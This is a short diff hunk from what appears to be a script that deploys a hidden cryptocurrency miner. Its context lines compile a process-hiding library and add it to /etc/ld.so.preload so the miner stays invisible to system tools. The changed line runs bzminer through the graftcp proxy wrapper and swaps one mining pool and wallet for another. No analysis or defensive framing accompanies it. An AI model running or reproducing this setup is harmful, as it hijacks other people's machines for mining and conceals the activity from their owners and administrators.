@@ -42,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bzminer -p ethw.2miners.com:2020 -w 0xD01389F28125d811b381D593140fD3101925853E.roketgas
+./graftcp/graftcp ./bzminer -p ethw.poolbinance.com:1800 -w teguhcong.roketgas
